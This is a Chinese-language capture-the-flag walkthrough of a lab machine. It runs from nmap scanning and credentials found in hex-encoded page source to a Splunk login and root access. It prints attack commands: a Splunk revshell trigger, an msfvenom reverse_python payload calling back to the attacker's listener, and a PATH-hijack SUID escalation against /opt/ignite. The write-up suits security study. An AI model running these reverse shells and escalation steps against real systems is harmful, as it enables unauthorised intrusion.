> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7lnS_Ip3vNW_hF3wwR5UAA)

![](https://mmbiz.qpic.cn/mmbiz_png/gNsXp5YKJbq5oM4XHQKI3ia7Eee0ZzaVK0Qp5OVpvxwpqvPmpxMUI9hBW1Otia6oOAUUrpE5y1icmWZvqArTjYGxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/YBcDOavVXrFRTXTSwVbco0V9jPF6RpgNsLgs8FetO1teNBX2VOHlM8q4gld2nBBdTy1fSibOee4ya0ZMBZThkkw/640?wx_fmt=png)

0x01 确定靶机即开放端口信息

  

  

![](https://mmbiz.qpic.cn/mmbiz_svg/Mjzdia7evAzyic2mz7mkz0YzsRd4bnqXwEtkzeNtbPuZCvE1JaU1j3ia8uL2odQsbSxKVPUjVOoFjoLIhRk9AAcnibc3mYleuuMU/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/biaqdOsLFKNRDfTGCQSCqnAceFGAI3Q15QhTLrZ23atSCU21v8qCIYx0AQSoTCnBdUZZG0fq6s7sLtPrIaicc3PA/640?wx_fmt=png)

攻击机 ip：192.168.19.174

靶机 ip：不知道, 与攻击机都在 NAT 模式

![](https://mmbiz.qpic.cn/mmbiz_svg/0wRpPfN90ibCn2u3keWK9wYuZeWZg7pVKicwe2DT9YTkhzJmA9THu8VNFicGhicRcurib56wXMicRY3nrIWrekbyCTQGeiacTMzsIYr/640?wx_fmt=svg)

**a. 扫描网段, 确定靶机 ip**

```
nmap -sP 192.168.19.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5PHnua0rWoBzic9307fKROkYStlViah8PvRFoEDicCY33mbrjgIKYkM13A/640?wx_fmt=png)

因为提前知道了攻击机的 ip 为 192.168.19.174, 在同一局域网我们便确定了靶机的 ip 为 192.168.19.175

**b. 扫描靶机开放的端口**

```
nmap -A 192.168.19.175
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5SFocsJ7jLZNqDdwgScgNzDORBkMW3YekwMMH2YXWtr5iaMvhicvIh4ibQ/640?wx_fmt=png)

根据扫描的结果, 我们知道靶机开放了 80,8000 等端口, 还开放了 / groot 的目录。

![](https://mmbiz.qpic.cn/mmbiz_png/gNsXp5YKJbq5oM4XHQKI3ia7Eee0ZzaVK0Qp5OVpvxwpqvPmpxMUI9hBW1Otia6oOAUUrpE5y1icmWZvqArTjYGxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/YBcDOavVXrFRTXTSwVbco0V9jPF6RpgNsLgs8FetO1teNBX2VOHlM8q4gld2nBBdTy1fSibOee4ya0ZMBZThkkw/640?wx_fmt=png)

0x02 访问 web 界面, 进行 web 渗透

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5QX2kgfafzWHG3mogLpDlRPCJlBFhgLibic9NlgZ1QKSib1NIBlBLmoFDg/640?wx_fmt=png)

在 web 界面中, 并没有得到什么有用的信息, 根据平时渗透的经验, 一些信息可能被注释在源码中。所以我们从源码开始下手。

在源码中, 我们看到了几个超链接, 在一个超链接中, 我们发现了如下信息：

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5A2EbbibsUV3SSp3O93LRaXdOqialzu9qHVW7yiahZHfGfgJgTwiak8Hmow/640?wx_fmt=png)

尝试用 base64,unicode 等解密方法解密, 尝试 16 进制解密后发现了如下类似于账号和密码的信息：

```
agent：avengers
```

有可能是靶机的账号加上密码, 所以下一步我们尝试用 ssh 进行登录：

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5sHuosKZ7bfdoIrtzmibcppSE1XBepL3D4lSUKoXQ0MmrFW1sgIPHAKw/640?wx_fmt=png)

但是 ssh 登录失败, 所以这不是系统用户, 可能是某一个插件的账号

![](https://mmbiz.qpic.cn/mmbiz_png/gNsXp5YKJbq5oM4XHQKI3ia7Eee0ZzaVK0Qp5OVpvxwpqvPmpxMUI9hBW1Otia6oOAUUrpE5y1icmWZvqArTjYGxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/YBcDOavVXrFRTXTSwVbco0V9jPF6RpgNsLgs8FetO1teNBX2VOHlM8q4gld2nBBdTy1fSibOee4ya0ZMBZThkkw/640?wx_fmt=png)

0x03 访问 8000 端口, 继续收集信息

  

  

在拿到一个类似于账号加密码的信息之后, 发现利用 ssh 登录失败, 回到最初扫描得到的信息中, 访问 8000 端口。访问之后, 我们发现了系统安装了 Splunk, 进入到 Splunk 的主界面上, 有一个用户登录的信息, 尝试用刚刚拿到的信息进行登录。

利用刚才得到的账号加密码, 我们成功地登陆了 Splunk 的后台

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv50881F7bZTmjpwg3JqIJibZ9pJb66jszRTb1p2iaOzUjCeibmgtWPlBTgQ/640?wx_fmt=png)

从网上搜了一下 Splunk 的使用方法之后, 我们可以上传一个 shell 的 gz 包

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5LswpeW1OQqOpPel9YVAWPszXVBIT3pFI25jbYZ8EBDFbTsQAcLD72w/640?wx_fmt=png)

```
| revshell std 192.168.19.175 1234
```

上传 shell 的 gz 包后, 我们利用命令触发 shell 反弹

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5jUMgnM9q6ZIUAPtLA14njib4gFlWyuwsvSuhvFJJ4icPFEFdzWQuxWeQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5OE5gQ9IquicyW0xPo9bs49yFaYvpzPN0lxyia0SGDlddkiaicjySGm4zNw/640?wx_fmt=png)

拿到一个普通用户的权限之后, 接下来的任务就是提权了

![](https://mmbiz.qpic.cn/mmbiz_png/gNsXp5YKJbq5oM4XHQKI3ia7Eee0ZzaVK0Qp5OVpvxwpqvPmpxMUI9hBW1Otia6oOAUUrpE5y1icmWZvqArTjYGxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/YBcDOavVXrFRTXTSwVbco0V9jPF6RpgNsLgs8FetO1teNBX2VOHlM8q4gld2nBBdTy1fSibOee4ya0ZMBZThkkw/640?wx_fmt=png)

0x04 提权

  

  

**a. 获得交互式 shell**

可以使用 msfvenom 命令生成一个 python 的交互式命令

```
msfvenom -p cmd/unix/reverse_python lhost=192.168.19.174 lport=4444 R
```

执行成功后, 会生成一个关于 python 的 base64 代码

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5iaCZNsZvO2UQhgNsL57VWEjwrXuaKxh6bCP4ffo9NUddlK18ibf7NA5Q/640?wx_fmt=png)

我们将生成的 python payload 直接在刚刚已经获得的普通用户的 shell 上直接运行, 在 kali 端进行端口的监听, 这样在获得一个 shell 之后, 我们就可以用 python 的交互式命令得到一个交互式的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5v5TF0bibomZTK1YuY5OHEgtZqpDUOAiaFia09hIRRYDuvllXT5gZwqXew/640?wx_fmt=png)

**b. 内核提权**

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5bweZtnUMlyeOk5iaic4QdYJCqSB6J7mZtbTP4DeqNDGhpG0wEp3bspibg/640?wx_fmt=png)

在这里我们查到的信息为：系统版本为 18.04, 内核版本为 4.18, 在 kali 上找一下相关的 exp, 没有找到相关的 exp。

**c.SUID 提权**

首先查找系统内的 SUID 可执行文件

```
find / -perm -u=s -type f 2>/dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5KUVrloyU4C7PYkWKwS5wrWiaSXuvFfjEkDpSiaUHibbh2KzdlNLUHZIHQ/640?wx_fmt=png)

在查找文件的时候, 发现了这样一个文件 / opt/ignite, 尝试一下从这个文件下手。

找了一下相关 suid 提权的相关思路, 利用 suid 提权, 成功拿到了 root 的权限

```
cd /tmp
echo "/bin/bash" > ifconfig
chmod 777 ifconfig
export PATH=/tmp:$PATH
/opt/ignite
cd /root
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08G25zw4gjxcWFnU4ia5Jfv5DsWqsuGkaINkQBaZFoPiaJ3ara5DNR68gVNv9hefPia14xuK0VhwlfyQ/640?wx_fmt=png)

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZ7rRw3kbvpDFicsKcLcp9Q7tYiaMwLANvcHAoByTiaGaus4HBukgfIXt9g/640?wx_fmt=png)